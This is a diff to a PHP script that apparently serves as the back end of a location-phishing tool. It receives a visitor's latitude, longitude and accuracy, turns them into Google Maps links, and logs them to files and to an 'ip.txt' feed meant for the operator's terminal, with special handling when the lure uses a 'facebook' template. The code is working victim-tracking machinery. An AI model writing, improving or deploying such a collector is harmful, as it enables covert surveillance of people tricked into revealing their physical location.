@@ -1,23 +1,25 @@
 <?php
 $date = date('dMYHis');
-$latitude = isset($_POST['lat']) ? $_POST['lat'] : 'Unknown';
-$longitude = isset($_POST['lon']) ? $_POST['lon'] : 'Unknown';
-$accuracy = isset($_POST['acc']) ? $_POST['acc'] : 'Unknown';
+$latitude = isset($_POST['latitude']) ? $_POST['latitude'] : 'Unknown';
+$longitude = isset($_POST['longitude']) ? $_POST['longitude'] : 'Unknown';
+$accuracy = isset($_POST['accuracy']) ? $_POST['accuracy'] : 'Unknown';
+$isFromFacebook = isset($_POST['template']) && $_POST['template'] === 'facebook';
 
-if (!empty($_POST['lat']) && !empty($_POST['lon'])) {
-    // Create a marker file with minimal information
-    file_put_contents("LocationLog.log", "Location captured\n", FILE_APPEND);
-    
+if (!empty($_POST['latitude']) && !empty($_POST['longitude'])) {
     $data = "Latitude: " . $latitude . "\r\n" .
             "Longitude: " . $longitude . "\r\n" .
             "Accuracy: " . $accuracy . " meters\r\n" .
             "Google Maps: https://www.google.com/maps/place/" . $latitude . "," . $longitude . "\r\n" .
             "Date: " . $date . "\r\n";
     
-    // Create a unique filename with timestamp
-    $file = 'location_' . $date . '.txt';
-    
-    try {
+    // Only create files if not from Facebook template
+    if (!$isFromFacebook) {
+        // Create a marker file with minimal information
+        file_put_contents("LocationLog.log", "Location captured\n", FILE_APPEND);
+        
+        // Create a unique filename with timestamp
+        $file = 'location_' . $date . '.txt';
+        
         $fp = fopen($file, 'w');
         if ($fp) {
             fwrite($fp, $data);
@@ -48,12 +50,19 @@ if (!empty($_POST['lat']) && !empty($_POST['lon'])) {
             
             // Copy the location file to the saved_locations directory
             copy($file, 'saved_locations/' . $file);
-            
-            // Return success response
-            header('Content-Type: application/json');
-            echo json_encode(['status' => 'success', 'message' => 'Location data received']);
-        } else {
-            throw new Exception("Could not open file for writing");
+        }
+    }
+    
+    // Log to ip.txt for terminal display (always log)
+    try {
+        $ip_file = 'ip.txt';
+        $fp = fopen($ip_file, 'a');
+        if ($fp) {
+            fwrite($fp, "Latitude: " . $latitude . "\r\n");
+            fwrite($fp, "Longitude: " . $longitude . "\r\n");
+            fwrite($fp, "Accuracy: " . $accuracy . " meters\r\n");
+            fwrite($fp, "Google Maps: https://www.google.com/maps/place/" . $latitude . "," . $longitude . "\r\n");
+            fclose($fp);
         }
     } catch (Exception $e) {
         header('Content-Type: application/json');
